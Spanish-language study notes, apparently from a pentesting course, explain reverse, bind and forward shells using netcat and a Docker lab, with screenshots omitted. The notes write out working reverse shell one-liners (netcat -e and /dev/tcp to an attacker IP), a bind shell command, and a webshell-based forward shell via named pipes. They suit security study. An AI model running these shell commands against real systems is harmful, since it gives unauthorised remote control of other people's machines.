
**Reverse shell** -> Permite al atacante conectarse a una máquina remota desde una máquina de su propiedad, es decir, establecemos una conexión entre la máquina vulneraba y la máquina atacante.

Ej:
Podemos ponernos en escucha por un puerto dado con nc en nuestra máquina atacante (ej: nc -nlvp 443), y desde la máquina atacada nos enviamos una bash a nuestro puerto ( ej: nc -e /bin/bash ipAtacante 443 (este es si esta netcat instalado) otro ej: bash -i >& /dev/tcp/ipAtacante/443 0>&1 (este es un ejemplo si netcat no está instalado pero hay más opciones) )

Para este ejemplo creamos un docker y nos ponemos en escucha por el puerto 443 de nuestra máquina atacante: 

![[Pasted image 20231107111429.png]]

En este caso el docker no tiene instalado netcat por lo que lo instalamos nosotros:

![[Pasted image 20231107111514.png]]

**Netcat puede ser llamado de varias maneras, y este es uno de esos casos en los que se llama diferente**

*Previamente*:

![[Pasted image 20231107111814.png]]

Tenemos que conocer la ip de docker ya que en este caso sería la nuestra.

Ahora ejecutamos la siguiente línea en la máquina victima: 

![[Pasted image 20231107111917.png]]

Una vez ejecutado parece que no ha pasado nada a pesar de tener conexión:

![[Pasted image 20231107111946.png]]

Pero si escribimos, veremos que si tenemos la bash:

![[Pasted image 20231107112013.png]]


***Importante*** -> Vamos a tener la bash del usuario por el que nos lo hayamos mandado, es decir, en este caso es root, pero si fuera un usuario normal sería la bash de ese usuario.



---------------- 

**Bind shell** -> Aquí lo que hacemos es que "ofrecemos" la consola desde la máquina victima, es decir, en la máquina vulnerada nos ponemos en escucha por un puerto y aquí ponemos una bash (desde la máquina vulnerada : nc -nlvp 4646 -e /bin/bash), y como atacante, nos conectamos con netcat a ese puerto (nc ipVíctima 4646) y de esta manera obtenemos la shell.

**Mantenemos el docker previo**

![[Pasted image 20231107112351.png]]

Aquí vemos como con netcat nos ponemos en escucha por el 443 y en ese puerto ofrecemos una bash. Y ahora nos conectamos por la máquina atacante:

![[Pasted image 20231107112502.png]]

*La ip es la de la máquina víctima*
![[Pasted image 20231107112550.png]]

Y ya tendríamos conectividad:

![[Pasted image 20231107112622.png]]

----------------

**Forward shell** -> En este caso, estamos intentado usar cualquiera de las dos opciones anteriores pero hay algo que nos esté denegando el acceso, esto puede ser debido a que la máquina víctima tiene el firewall activado y es lo que nos bloquea el acceso.

Esta técnica implementa los **named pipes** (o tuberías nombradas) , que es el nombre de una técnica para lograr la comunicación entre procesos.

Instalamos iptables en la máquina victima ->  Es un programa de utilidad de espacio de usuario que permite a un administrador de sistema para configurar las tablas​ proporcionadas por el cortafuegos del núcleo Linux y las cadenas y reglas que almacena

En este caso, intentamos mandarnos una shell y no podemos:

![[Pasted image 20231110103132.png]]

![[Pasted image 20231110103142.png]]

Se queda así siempre, entonces hay que hacer lo siguiente.

Nos descargamos del github de s4vitar un script en python que se llama tty over http, y ahora lo editamos.

![[Pasted image 20231110103608.png]]

A priori solo hay que cambiar las urls, ya que vienen con index.php en vez de con cmd.php, que es el script que estamos usando nosotros.

También tenemos que editar el script en php dentro de la máquina ya que este script no funciona con etiquetas preformateadas como era <pre/> y se quedaría de la siguiente manera:

![[Pasted image 20231110103843.png]]

Y ejecutamos el script:

![[Pasted image 20231110104027.png]]

![[Pasted image 20231110104036.png]]

Y ya tenemos conectividad con la máquina

Este script lo que hace es que cuando le damos un comando, mkfifo lo que hace es meterlo en un archivo y luego hace un cat de otro dándonos el resultado.

-----

**Comandos netcat**:

-n -> No queremos que aplique resolución dns (igual que nmap)

-l -> Listen all connections, para poner el modo escucha

-v -> Verbose igual que nmap

-p -> Indicamos el puerto

-------

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

En esta web hay un montón de reverse shell en diferentes lenguajes